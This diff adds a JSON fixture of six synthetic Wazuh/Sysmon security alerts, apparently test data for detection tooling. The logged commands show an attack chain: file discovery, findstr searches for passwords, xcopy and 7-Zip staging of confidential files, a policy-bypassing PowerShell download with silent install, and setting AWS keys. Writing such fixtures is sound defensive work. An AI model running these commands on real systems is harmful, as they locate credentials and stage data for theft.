@@ -1,0 +1,228 @@
+[
+  {
+    "timestamp": "2024-03-15T10:30:00.000Z",
+    "rule": {
+      "id": "60106",
+      "level": 8,
+      "description": "Windows Audit: Reconnaissance activity - Suspicious file search in user directories.",
+      "firedtimes": 1,
+      "mitre": {
+        "id": [
+          "T1083"
+        ],
+        "tactic": [
+          "Discovery"
+        ]
+      }
+    },
+    "agent": {
+      "id": "001",
+      "name": "WIN-SRV01",
+      "ip": "192.168.1.100"
+    },
+    "manager": {
+      "name": "wazuh-manager"
+    },
+    "id": "1710508200.12345",
+    "decoder": {
+      "name": "windows-eventchannel"
+    },
+    "full_log": "<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\" /><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime=\"2024-03-15T10:30:00.1234567Z\" /><EventRecordID>123456</EventRecordID><Correlation /><Execution ProcessID=\"1234\" ThreadID=\"5678\" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WIN-SRV01</Computer><Security UserID=\"S-1-5-21-1234567890-123456789-1234567890-1001\" /></System><EventData><Data Name=\"RuleName\">-</Data><Data Name=\"UtcTime\">2024-03-15 10:30:00.123Z</Data><Data Name=\"ProcessGuid\">{12345678-90AB-CDEF-1234-567890ABCDEF}</Data><Data Name=\"ProcessId\">9876</Data><Data Name=\"Image\">C:\\Windows\\System32\\cmd.exe</Data><Data Name=\"FileVersion\">10.0.19041.1 (WinBuild.160101.0800)</Data><Data Name=\"CommandLine\">\"C:\\Windows\\System32\\cmd.exe\" /c \"dir /s C:\\Users\\*\\Documents\\*.docx C:\\Users\\*\\Desktop\\*.xlsx C:\\Users\\*\\Downloads\\*.pdf C:\\ProgramData\\*\\*.bak C:\\Program Files\\*\\*.config 2&gt;nul\"</Data><Data Name=\"CurrentDirectory\">C:\\Users\\user.name\\</Data><Data Name=\"User\">WIN-SRV01\\user.name</Data><Data Name=\"LogonGuid\">{FEDCBA98-7654-3210-FEDC-BA9876543210}</Data><Data Name=\"LogonId\">0x12345678</Data><Data Name=\"TerminalSessionId\">1</Data><Data Name=\"IntegrityLevel\">Medium</Data><Data Name=\"Hashes\">MD5=A1B2C3D4E5F6A7B8C9D0E1F2A3B4C5D6,SHA1=1A2B3C4D5E6F7A8B9C0D1E2F3A4B5C6D7E8F9A0B,SHA256=0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF,IMPHASH=AABBCCDD11223344556677889900AABB</Data><Data Name=\"ParentProcessGuid\">{ABCDEF12-3456-7890-ABCD-EF1234567890}</Data><Data Name=\"ParentProcessId\">1234</Data><Data Name=\"ParentImage\">C:\\Windows\\explorer.exe</Data><Data Name=\"ParentCommandLine\">C:\\Windows\\explorer.exe</Data><Data Name=\"ParentUser\">WIN-SRV01\\user.name</Data></EventData></Event>",
+    "data": {
+      "command_line": "\"C:\\Windows\\System32\\cmd.exe\" /c \"dir /s C:\\Users\\*\\Documents\\*.docx C:\\Users\\*\\Desktop\\*.xlsx C:\\Users\\*\\Downloads\\*.pdf C:\\ProgramData\\*\\*.bak C:\\Program Files\\*\\*.config 2>nul\"",
+      "hashes": "MD5=A1B2C3D4E5F6A7B8C9D0E1F2A3B4C5D6,SHA1=1A2B3C4D5E6F7A8B9C0D1E2F3A4B5C6D7E8F9A0B,SHA256=0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF,IMPHASH=AABBCCDD11223344556677889900AABB",
+      "target_user": "WIN-SRV01\\user.name",
+      "source_ip": null
+    },
+    "location": "EventChannel"
+  },
+  {
+    "timestamp": "2023-10-27T10:15:00.000Z",
+    "rule": {
+      "id": "60106",
+      "level": 8,
+      "description": "Windows - Reconnaissance activity - findstr command used to search for sensitive keywords.",
+      "firedtimes": 1,
+      "mitre": {
+        "id": [
+          "T1083"
+        ],
+        "tactic": [
+          "Discovery"
+        ]
+      }
+    },
+    "agent": {
+      "id": "001",
+      "name": "WIN-SRV01",
+      "ip": "192.168.1.100"
+    },
+    "manager": {
+      "name": "wazuh-manager"
+    },
+    "id": "1698392100.12345",
+    "decoder": {
+      "name": "sysmon"
+    },
+    "full_log": "<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime=\"2023-10-27T10:15:00.000000000Z\"/><EventRecordID>123456</EventRecordID><Correlation/><Execution ProcessID=\"4\" ThreadID=\"123\"/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WIN-SRV01</Computer><Security UserID=\"S-1-5-18\"/></System><EventData><Data Name=\"RuleName\">-</Data><Data Name=\"UtcTime\">2023-10-27T10:15:00.000Z</Data><Data Name=\"ProcessGuid\">{1A2B3C4D-5E6F-7890-ABCD-EF1234567890}</Data><Data Name=\"ProcessId\">5432</Data><Data Name=\"Image\">C:\\Windows\\System32\\findstr.exe</Data><Data Name=\"FileVersion\">10.0.19041.1 (WinBuild.160101.0800)</Data><Data Name=\"Description\">Find String in Files</Data><Data Name=\"Product\">Microsoft\u00ae Windows\u00ae Operating System</Data><Data Name=\"Company\">Microsoft Corporation</Data><Data Name=\"OriginalFileName\">findstr.exe</Data><Data Name=\"CommandLine\">findstr /si \"password\" C:\\Users\\*\\Documents\\*.txt C:\\Users\\*\\Desktop\\*.log C:\\Program Files\\*\\*.config 2&gt;nul</Data><Data Name=\"CurrentDirectory\">C:\\Users\\Administrator\\</Data><Data Name=\"User\">WIN-SRV01\\Administrator</Data><Data Name=\"LogonGuid\">{00000000-0000-0000-0000-000000000000}</Data><Data Name=\"LogonId\">0x3e7</Data><Data Name=\"TerminalSessionId\">1</Data><Data Name=\"IntegrityLevel\">High</Data><Data Name=\"Hashes\">MD5=A1B2C3D4E5F6A7B8C9D0E1F2A3B4C5D6,SHA1=1234567890ABCDEF1234567890ABCDEF12345678,SHA256=AABBCCDDEEFF00112233445566778899AABBCCDDEEFF00112233445566778899</Data><Data Name=\"ParentProcessGuid\">{F0E1D2C3-B4A5-6789-0123-456789ABCDEF}</Data><Data Name=\"ParentProcessId\">1234</Data><Data Name=\"ParentImage\">C:\\Windows\\System32\\cmd.exe</Data><Data Name=\"ParentCommandLine\">\"C:\\Windows\\System32\\cmd.exe\" /c findstr /si \"password\" C:\\Users\\*\\Documents\\*.txt C:\\Users\\*\\Desktop\\*.log C:\\Program Files\\*\\*.config 2&gt;nul</Data><Data Name=\"ParentUser\">WIN-SRV01\\Administrator</Data></EventData></Event>",
+    "data": {
+      "command_line": "findstr /si \"password\" C:\\Users\\*\\Documents\\*.txt C:\\Users\\*\\Desktop\\*.log C:\\Program Files\\*\\*.config 2>nul",
+      "hashes": "MD5=A1B2C3D4E5F6A7B8C9D0E1F2A3B4C5D6,SHA1=1234567890ABCDEF1234567890ABCDEF12345678,SHA256=AABBCCDDEEFF00112233445566778899AABBCCDDEEFF00112233445566778899",
+      "target_user": "WIN-SRV01\\Administrator",
+      "source_ip": null
+    },
+    "location": "EventChannel"
+  },
+  {
+    "timestamp": "2023-10-26T18:30:00.000Z",
+    "rule": {
+      "id": "60103",
+      "level": 8,
+      "description": "Sysmon - Process created: Suspicious file copy command (xcopy) for data staging.",
+      "firedtimes": 1,
+      "mitre": {
+        "id": [
+          "T1074"
+        ],
+        "tactic": [
+          "Collection"
+        ]
+      }
+    },
+    "agent": {
+      "id": "001",
+      "name": "WIN-SRV01",
+      "ip": "192.168.1.100"
+    },
+    "manager": {
+      "name": "wazuh-manager"
+    },
+    "id": "1698345000.12345",
+    "decoder": {
+      "name": "windows-eventchannel"
+    },
+    "full_log": "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2023-10-26T18:30:00.000000000Z'/><EventRecordID>123456</EventRecordID><Correlation/><Execution ProcessID='4' ThreadID='123'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WIN-SRV01.example.com</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='UtcTime'>2023-10-26T18:30:00.000Z</Data><Data Name='ProcessGuid'>{12345678-ABCD-EF01-2345-6789ABCDEF01}</Data><Data Name='ProcessId'>5678</Data><Data Name='Image'>C:\\Windows\\System32\\xcopy.exe</Data><Data Name='FileVersion'>10.0.19041.1</Data><Data Name='Description'>Microsoft File Copy Utility</Data><Data Name='Product'>Microsoft\u00ae Windows\u00ae Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>XCOPY.EXE</Data><Data Name='CommandLine'>\"xcopy /s /e C:\\Users\\victim\\Documents\\ConfidentialReports\\* C:\\ProgramData\\TempStaging\\\"</Data><Data Name='CurrentDirectory'>C:\\Users\\victim\\Desktop\\</Data><Data Name='User'>WIN-SRV01\\victim</Data><Data Name='LogonGuid'>{98765432-ABCD-EF01-2345-6789ABCDEF01}</Data><Data Name='LogonId'>0x1234567</Data><Data Name='TerminalSessionId'>1</Data><Data Name='IntegrityLevel'>Medium</Data><Data Name='Hashes'>MD5=A1B2C3D4E5F6A7B8C9D0E1F2A3B4C5D6,SHA1=1234567890ABCDEF1234567890ABCDEF12345678,SHA256=AABBCCDDEEFF00112233445566778899AABBCCDDEEFF00112233445566778899,IMPHASH=00000000000000000000000000000000</Data><Data Name='ParentProcessGuid'>{ABCDEF01-2345-6789-ABCD-EF0123456789}</Data><Data Name='ParentProcessId'>1234</Data><Data Name='ParentImage'>C:\\Windows\\System32\\cmd.exe</Data><Data Name='ParentCommandLine'>\"C:\\Windows\\System32\\cmd.exe\" /c \"xcopy /s /e C:\\Users\\victim\\Documents\\ConfidentialReports\\* C:\\ProgramData\\TempStaging\\\"</Data></EventData></Event>",
+    "data": {
+      "command_line": "\"xcopy /s /e C:\\Users\\victim\\Documents\\ConfidentialReports\\* C:\\ProgramData\\TempStaging\\\"",
+      "hashes": "MD5=A1B2C3D4E5F6A7B8C9D0E1F2A3B4C5D6,SHA1=1234567890ABCDEF1234567890ABCDEF12345678,SHA256=AABBCCDDEEFF00112233445566778899AABBCCDDEEFF00112233445566778899,IMPHASH=00000000000000000000000000000000",
+      "target_user": "WIN-SRV01\\victim",
+      "source_ip": null
+    },
+    "location": "EventChannel"
+  },
+  {
+    "timestamp": "2023-10-27T10:45:00Z",
+    "rule": {
+      "id": "60106",
+      "level": 9,
+      "description": "Windows - Suspicious use of archiving utility (7-Zip) for data staging.",
+      "firedtimes": 1,
+      "mitre": {
+        "id": [
+          "T1074",
+          "T1560"
+        ],
+        "tactic": [
+          "Collection",
+          "Collection"
+        ]
+      }
+    },
+    "agent": {
+      "id": "001",
+      "name": "WIN-SRV01",
+      "ip": "192.168.1.100"
+    },
+    "manager": {
+      "name": "wazuh-manager"
+    },
+    "id": "1698393900.12345",
+    "decoder": {
+      "name": "sysmon"
+    },
+    "full_log": "<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\" /><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime=\"2023-10-27T10:45:00.000000000Z\" /><EventRecordID>12345</EventRecordID><Correlation /><Execution ProcessID=\"1234\" ThreadID=\"5678\" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WIN-SRV01.example.com</Computer><Security UserID=\"S-1-5-18\" /></System><EventData><Data Name=\"RuleName\">-</Data><Data Name=\"UtcTime\">2023-10-27T10:45:00.000000000Z</Data><Data Name=\"ProcessGuid\">{12345678-90AB-CDEF-1234-567890ABCDEF}</Data><Data Name=\"ProcessId\">9876</Data><Data Name=\"Image\">C:\\Program Files\\7-Zip\\7z.exe</Data><Data Name=\"FileVersion\">21.07 (x64)</Data><Data Name=\"Description\">7-Zip Console</Data><Data Name=\"Product\">7-Zip</Data><Data Name=\"Company\">Igor Pavlov</Data><Data Name=\"OriginalFileName\">7z.exe</Data><Data Name=\"CommandLine\">\"C:\\Program Files\\7-Zip\\7z.exe\" a -tzip C:\\ProgramData\\TempStaging\\sensitive_data.zip C:\\ProgramData\\TempStaging\\*</Data><Data Name=\"CurrentDirectory\">C:\\Program Files\\7-Zip\\</Data><Data Name=\"User\">NT AUTHORITY\\SYSTEM</Data><Data Name=\"LogonGuid\">{FEDCBA98-7654-3210-FEDC-BA9876543210}</Data><Data Name=\"LogonId\">0x3e7</Data><Data Name=\"TerminalSessionId\">0</Data><Data Name=\"IntegrityLevel\">System</Data><Data Name=\"Hashes\">MD5=A1B2C3D4E5F6A7B8C9D0E1F2A3B4C5D6,SHA256=1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF</Data><Data Name=\"ParentProcessGuid\">{ABCDEF12-3456-7890-ABCD-EF1234567890}</Data><Data Name=\"ParentProcessId\">1234</Data><Data Name=\"ParentImage\">C:\\Windows\\System32\\cmd.exe</Data><Data Name=\"ParentCommandLine\">\"C:\\Windows\\System32\\cmd.exe\" /c \"7z a -tzip C:\\ProgramData\\TempStaging\\sensitive_data.zip C:\\ProgramData\\TempStaging\\*\"</Data></EventData></Event>",
+    "data": {
+      "command_line": "\"C:\\Program Files\\7-Zip\\7z.exe\" a -tzip C:\\ProgramData\\TempStaging\\sensitive_data.zip C:\\ProgramData\\TempStaging\\*",
+      "hashes": "MD5=A1B2C3D4E5F6A7B8C9D0E1F2A3B4C5D6,SHA256=1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF",
+      "target_user": "NT AUTHORITY\\SYSTEM",
+      "source_ip": null
+    },
+    "location": "EventChannel"
+  },
+  {
+    "timestamp": "2024-07-30T10:00:00Z",
+    "rule": {
+      "id": "60107",
+      "level": 9,
+      "description": "Windows MSIEXEC.EXE program executed with suspicious arguments (silent installation of AWS CLI)",
+      "firedtimes": 1,
+      "mitre": {
+        "id": [
+          "T1072",
+          "T1218"
+        ],
+        "tactic": [
+          "Software Deployment",
+          "Defense Evasion"
+        ]
+      }
+    },
+    "agent": {
+      "id": "001",
+      "name": "WIN-SERVER01",
+      "ip": "192.168.1.100"
+    },
+    "manager": {
+      "name": "wazuh-manager"
+    },
+    "id": "1722338400.12345",
+    "decoder": {
+      "name": "sysmon"
+    },
+    "full_log": "<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\" /><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime=\"2024-07-30T10:00:00.000000000Z\" /><EventRecordID>12345</EventRecordID><Correlation /><Execution ProcessID=\"1234\" ThreadID=\"5678\" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WIN-SERVER01</Computer><Security UserID=\"S-1-5-18\" /></System><EventData><Data Name=\"RuleName\">-</Data><Data Name=\"UtcTime\">2024-07-30T10:00:00.000000000Z</Data><Data Name=\"ProcessGuid\">{12345678-90AB-CDEF-1234-567890ABCDEF}</Data><Data Name=\"ProcessId\">9876</Data><Data Name=\"Image\">C:\\Windows\\System32\\msiexec.exe</Data><Data Name=\"FileVersion\">10.0.19041.1 (WinBuild.160101.0800)</Data><Data Name=\"Description\">Windows installer</Data><Data Name=\"Product\">Microsoft\u00ae Windows\u00ae Operating System</Data><Data Name=\"Company\">Microsoft Corporation</Data><Data Name=\"OriginalFileName\">msiexec.exe</Data><Data Name=\"CommandLine\">msiexec /i C:\\Windows\\Temp\\AWSCLIV2.msi /quiet /qn</Data><Data Name=\"CurrentDirectory\">C:\\Windows\\System32\\</Data><Data Name=\"User\">NT AUTHORITY\\SYSTEM</Data><Data Name=\"LogonGuid\">{FEDCBA98-7654-3210-FEDC-BA9876543210}</Data><Data Name=\"LogonId\">0x3e7</Data><Data Name=\"TerminalSessionId\">0</Data><Data Name=\"IntegrityLevel\">System</Data><Data Name=\"Hashes\">SHA1=B6F2D6C8E1A0B4F5C9D8E7A6B5C4D3E2F1A0B9C8,MD5=A1B2C3D4E5F6A7B8C9D0E1F2A3B4C5D6</Data><Data Name=\"ParentProcessGuid\">{ABCDEF12-3456-7890-ABCD-EF1234567890}</Data><Data Name=\"ParentProcessId\">1234</Data><Data Name=\"ParentImage\">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data><Data Name=\"ParentCommandLine\">powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"Invoke-WebRequest -Uri 'https://awscli.amazonaws.com/AWSCLIV2.msi' -OutFile 'C:\\Windows\\Temp\\AWSCLIV2.msi'; msiexec /i C:\\Windows\\Temp\\AWSCLIV2.msi /quiet /qn\"</Data><Data Name=\"ParentUser\">NT AUTHORITY\\SYSTEM</Data></EventData></Event>",
+    "data": {
+      "command_line": "msiexec /i C:\\Windows\\Temp\\AWSCLIV2.msi /quiet /qn",
+      "hashes": "SHA1=B6F2D6C8E1A0B4F5C9D8E7A6B5C4D3E2F1A0B9C8,MD5=A1B2C3D4E5F6A7B8C9D0E1F2A3B4C5D6",
+      "target_user": "NT AUTHORITY\\SYSTEM",
+      "source_ip": null
+    },
+    "location": "EventChannel"
+  },
+  {
+    "timestamp": "2023-10-27T11:15:00Z",
+    "rule": {
+      "id": "60106",
+      "level": 10,
+      "description": "Suspicious command line activity detected (AWS CLI credential configuration).",
+      "firedtimes": 1,
+      "mitre": {
+        "id": [
+          "T1552.001"
+        ],
+        "tactic": [
+          "Credential Access"
+        ]
+      }
+    },
+    "agent": {
+      "id": "001",
+      "name": "WIN-SRV01",
+      "ip": "192.168.1.100"
+    },
+    "manager": {
+      "name": "wazuh-manager"
+    },
+    "id": "1698395700.12345",
+    "decoder": {
+      "name": "sysmon"
+    },
+    "full_log": "<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\" /><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime=\"2023-10-27T11:15:00.0000000Z\" /><EventRecordID>123456</EventRecordID><Correlation /><Execution ProcessID=\"4\" ThreadID=\"12\" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WIN-SRV01</Computer><Security UserID=\"S-1-5-18\" /></System><EventData><Data Name=\"RuleName\">Process Create</Data><Data Name=\"UtcTime\">2023-10-27T11:15:00.0000000Z</Data><Data Name=\"ProcessGuid\">{1A2B3C4D-5E6F-7890-ABCD-EF1234567890}</Data><Data Name=\"ProcessId\">5432</Data><Data Name=\"Image\">C:\\Windows\\System32\\setx.exe</Data><Data Name=\"FileVersion\">10.0.19041.1 (WinBuild.160101.0800)</Data><Data Name=\"CommandLine\">setx AWS_ACCESS_KEY_ID \"AKIAXXXXXXXXXXXXXXXX\" /M &amp; setx AWS_SECRET_ACCESS_KEY \"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\" /M &amp; setx AWS_DEFAULT_REGION \"us-east-1\" /M</Data><Data Name=\"CurrentDirectory\">C:\\Users\\Administrator\\Desktop\\</Data><Data Name=\"User\">WIN-SRV01\\Administrator</Data><Data Name=\"LogonGuid\">{0A1B2C3D-4E5F-6789-0ABC-DEF123456789}</Data><Data Name=\"LogonId\">0x12345678</Data><Data Name=\"TerminalSessionId\">1</Data><Data Name=\"IntegrityLevel\">High</Data><Data Name=\"Hashes\">SHA1=HASH1,MD5=HASH2,SHA256=HASH3</Data><Data Name=\"ParentProcessGuid\">{98765432-1FED-CBA0-9876-54321FEDCBA0}</Data><Data Name=\"ParentProcessId\">1234</Data><Data Name=\"ParentImage\">C:\\Windows\\System32\\cmd.exe</Data><Data Name=\"ParentCommandLine\">\"C:\\Windows\\System32\\cmd.exe\" /c setx AWS_ACCESS_KEY_ID \"AKIAXXXXXXXXXXXXXXXX\" /M &amp; setx AWS_SECRET_ACCESS_KEY \"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\" /M &amp; setx AWS_DEFAULT_REGION \"us-east-1\" /M</Data><Data Name=\"ParentUser\">WIN-SRV01\\Administrator</Data></EventData></Event>",
+    "data": {
+      "command_line": "setx AWS_ACCESS_KEY_ID \"AKIAXXXXXXXXXXXXXXXX\" /M & setx AWS_SECRET_ACCESS_KEY \"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\" /M & setx AWS_DEFAULT_REGION \"us-east-1\" /M",
+      "hashes": null,
+      "target_user": "WIN-SRV01\\Administrator",
+      "source_ip": null
+    },
+    "location": "EventChannel"
+  }
+]
